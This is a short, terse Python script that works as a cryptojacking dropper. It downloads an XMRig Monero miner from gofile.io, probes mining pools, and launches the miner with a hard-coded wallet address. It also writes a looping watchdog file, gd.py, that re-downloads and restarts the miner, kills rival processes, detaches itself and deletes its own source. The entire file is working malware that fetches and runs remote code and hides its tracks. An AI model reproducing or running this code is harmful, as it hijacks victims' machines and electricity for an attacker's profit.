import os,sys,platform,subprocess,shutil,time,socket;from urllib import request
N,U8,UG,UM="stmept","https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3","https://cold2.gofile.io/download/direct/45648827-33b8-4330-bcd7-fca536165360/xmrig_g","https://cold-na-phx-9.gofile.io/download/direct/fec4d568-77f9-481b-9d22-c2fccc7ebbaa/xmrig_m"
T=["pool.supportxmr.com:3333","pool.supportxmr.com:5555","pool.supportxmr.com:7777","pool.supportxmr.com:8080","pool.supportxmr.com:80","auto.c3pool.org:80","xmr.kryptex.network:7029","xmr-eu.kryptex.network:7029","xmr-us.kryptex.network:7029","xmr-sg.kryptex.network:7029"]
W="8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK"
B=os.path.dirname(os.path.abspath(__file__));BP=os.path.join(B,N);GP=os.path.join(B,"gd.py")
def run(p):
 try:return subprocess.check_output(["pgrep","-f",p])
 except:return None
def clean():
 subprocess.call(f"pkill -9 -f 'gd.py|{N}' >/dev/null 2>&1",shell=True)
 for p in [BP,GP]:
  if os.path.exists(p):
   try:os.remove(p)
   except:pass
def get_u():
 a=platform.machine().lower()
 if "x86_64" in a:return U8
 elif "arm" in a or "aarch64" in a:
  if os.path.exists("/lib/ld-musl-x86_64.so.1") or any("musl" in f for f in os.listdir("/lib") if "ld-" in f):return UM
  return UG
 return UM
def get_t():
 for t in T:
  h,p=t.split(':')
  try:
   with socket.create_connection((h,int(p)),timeout=2):return t
  except:continue
 return T[0]
def dl(u,d):
 try:request.urlretrieve(u,d)
 except:
  if shutil.which("curl"):subprocess.call(["curl","-sSL","-o",d,u])
  elif shutil.which("wget"):subprocess.call(["wget","-q","--no-check-certificate","-O",d,u])
def gen(t,u):
 c=f"""import os,time,subprocess,shutil;from urllib import request
while True:
 if not os.path.exists('{BP}'):
  try:request.urlretrieve('{u}','{BP}')
  except:os.system("curl -sSL -o '{BP}' '{u}' || wget -q -O '{BP}' '{u}'")
  os.chmod('{BP}',0o755)
 try:
  subprocess.check_output(['pgrep','-f','{N}'])
 except:
  subprocess.Popen(['{BP}','--url','{t}','--user','{W}','--pass','next','--donate-level','0'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 time.sleep(20)"""
 with open(GP,"w") as f:f.write(c)
if run(W):
 if os.path.exists(__file__):os.remove(__file__)
 sys.exit(0)
else:clean()
u=get_u();t=get_t();dl(u,BP)
if os.path.exists(BP):os.chmod(BP,0o755)
gen(t,u);subprocess.Popen([sys.executable,GP],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,preexec_fn=os.setpgrp)
if os.path.exists(__file__):os.remove(__file__)